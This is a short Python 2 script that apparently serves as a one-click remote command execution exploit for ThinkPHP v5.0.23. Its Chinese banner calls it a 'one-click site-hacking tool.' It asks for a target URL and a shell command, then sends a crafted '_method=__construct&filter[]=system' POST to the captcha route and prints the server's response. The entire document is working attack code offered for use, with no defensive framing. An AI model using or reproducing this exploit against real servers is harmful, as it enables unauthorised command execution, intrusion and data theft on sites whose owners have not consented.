# -*- coding: UTF-8 -*-
import requests
import re

url = raw_input('请输入url:')
path="/index.php?s=captcha"
cmd = raw_input('请输入要执行的命令:')

print('欢迎使用thinkphp v5.0.23一键日站工具，作者:kurokoleung')

headers = {
	"Content-Type": "application/x-www-form-urlencoded",
	"Host": "{url}".format(url=url[7:]),
	"Referer": "{url}{path}".format(url=url,path=path),
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

payload = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={cmd}".format(cmd=cmd)

r = requests.post(url=url+path,data=payload,headers=headers)
pattern = re.compile("<(.*)>")
s = r.text
#print(headers)
#print(payload)
#print(r.text)
print(pattern.findall(s))